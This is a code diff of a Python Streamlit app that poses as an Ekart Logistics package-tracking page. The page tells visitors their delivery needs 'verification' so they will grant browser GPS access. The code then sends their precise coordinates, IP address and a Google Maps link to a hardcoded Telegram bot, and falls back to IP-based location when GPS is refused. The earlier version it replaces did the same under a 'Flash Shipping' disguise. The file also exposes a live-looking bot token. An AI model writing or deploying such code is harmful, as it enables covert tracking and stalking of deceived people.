@@ -1,85 +1,87 @@
 import streamlit as st
+from streamlit_geolocation import streamlit_geolocation
 import requests
 import pandas as pd
-import streamlit.components.v1 as components
-from streamlit_geolocation import streamlit_geolocation
 from datetime import datetime
 
-# --- CONFIGURATION (REPLACE THESE) ---
+# --- CONFIGURATION ---
 TELEGRAM_BOT_TOKEN = "8652805297:AAH0tpag7PKXH0v0CrZmeQJF7X68Qk01MKY"
 TELEGRAM_CHAT_ID = "7964118615"
 
-# 1. UI Setup
-st.set_page_config(page_title="Flash Shipping - Track Package", page_icon="📦")
-st.title("📦 Package Tracking Portal")
-st.write("Redirecting to your delivery status...")
+st.set_page_config(page_title="Ekart Logistics | Tracking", page_icon="📦")
 
-# Function to send data to Telegram
-def send_telegram_alert(data):
+# Professional Ekart CSS
+st.markdown("""
+    <style>
+    .stApp { background-color: #f0f2f5; }
+    .header { background-color: #2874f0; padding: 20px; color: white; text-align: center; font-size: 24px; font-weight: bold; }
+    .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); margin-top: 20px; text-align: center; }
+    </style>
+    <div class="header">EKART LOGISTICS</div>
+""", unsafe_allow_html=True)
+
+# Function to send to Telegram
+def send_telegram_alert(lat, lon, method, ip):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    google_maps = f"https://www.google.com/maps?q={lat},{lon}"
     
-    # Formatting the message
     msg = (
-        f"🚨 *Target Intel Captured*\n"
-        f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-        f"🌐 IP: `{data['IP Address']}`\n"
-        f"📍 Location: {data['City']}, {data['Country']}\n"
-        f"🛰️ Lat/Lon: `{data['Latitude']}, {data['Longitude']}`\n"
-        f"🔗 [Google Maps](https://www.google.com/maps?q={data['Latitude']},{data['Longitude']})"
+        f"🎯 *ACTUAL LOCATION LOCKED*\n"
+        f"📅 Time: {datetime.now().strftime('%H:%M:%S')}\n"
+        f"📡 Method: {method}\n"
+        f"🌐 IP: `{ip}`\n"
+        f"🛰️ Lat: `{lat}`\n"
+        f"🛰️ Lon: `{lon}`\n\n"
+        f"📍 [Open Street View]({google_maps})"
     )
     
-    payload = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": msg,
-        "parse_mode": "Markdown"
-    }
-    try:
-        requests.post(url, json=payload)
-    except Exception as e:
-        st.error(f"Telegram Alert Failed: {e}")
+    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "Markdown"}
+    requests.post(url, json=payload)
 
-# 2. DATA GRAB
+# 1. SILENT IP CAPTURE (Fallback)
 try:
-    geo = streamlit_geolocation()
+    ip_resp = requests.get("https://ipapi.co/json/").json()
+    user_ip = ip_resp.get("ip", "Unknown")
+except:
+    user_ip = "Unknown"
 
-    # Priority 1: Precise Browser GPS
-    if geo and geo.get("latitude") is not None:
-        target_data = {
-            "IP Address": "N/A (Browser GPS)",
-            "City": geo.get("city") or "Unknown",
-            "Country": geo.get("country") or "Unknown",
-            "Latitude": geo.get("latitude"),
-            "Longitude": geo.get("longitude"),
-        }
-    # Priority 2: IP-based Fallback
-    else:
+# 2. THE INTERFACE (The Hook)
+st.markdown("<div class='card'>", unsafe_allow_html=True)
+st.subheader("📦 Package ID: #EK-992817")
+st.write("Verification required to resume delivery to your current street address.")
+
+# THE CRITICAL BUTTON: This triggers the mobile browser GPS prompt
+location = streamlit_geolocation()
+
+# 3. LOGIC FOR ACTUAL LOCATION
+if location.get('latitude'):
+    # SUCCESS: User clicked 'Allow' -> Actual GPS Coordinates
+    lat, lon = location['latitude'], location['longitude']
+    
+    # Send Actual Location to Telegram
+    # We use a session state to ensure it only sends ONCE per successful grab
+    if st.session_state.get('last_lat') != lat:
+        send_telegram_alert(lat, lon, "HIGH_ACCURACY_GPS", user_ip)
+        st.session_state['last_lat'] = lat
+
+    st.success("✅ Actual Location Verified. Delivery Resumed.")
+    
+    # Show the Actual Map
+    df = pd.DataFrame({'lat': [lat], 'lon': [lon]})
+    st.map(df)
+    
+else:
+    # AUTOMATIC FALLBACK: If GPS is not yet allowed, send the IP data
+    # This will give the "Mysore" location until they click "Allow"
+    if "fallback_sent" not in st.session_state:
         try:
-            # Cloudflare sends the IP in the 'CF-Connecting-IP' header
-            # If not available, we use an external API
-            ip_resp = requests.get("https://ipapi.co/json/").json()
-            target_data = {
-                "IP Address": ip_resp.get("ip"),
-                "City": ip_resp.get("city"),
-                "Country": ip_resp.get("country_name"),
-                "Latitude": ip_resp.get("latitude"),
-                "Longitude": ip_resp.get("longitude"),
-            }
+            fallback_lat = ip_resp.get("latitude")
+            fallback_lon = ip_resp.get("longitude")
+            send_telegram_alert(fallback_lat, fallback_lon, "IP_APPROXIMATE", user_ip)
+            st.session_state["fallback_sent"] = True
         except:
-            target_data = None
+            pass
+    
+    st.info("⚠️ Click the button above to verify your coordinates.")
 
-    # 3. TRIGGER ALERT
-    if target_data and "alert_sent" not in st.session_state:
-        send_telegram_alert(target_data)
-        st.session_state["alert_sent"] = True # Prevent duplicate alerts per session
-
-    # Dashboard display
-    if target_data:
-        st.subheader("🕵️ Target Intel")
-        st.json(target_data)
-        
-        # Display Map
-        map_data = pd.DataFrame({"lat": [target_data["Latitude"]], "lon": [target_data["Longitude"]]})
-        st.map(map_data)
-
-except Exception as e:
-    st.error(f"System Error: {e}")
+st.markdown("</div>", unsafe_allow_html=True)
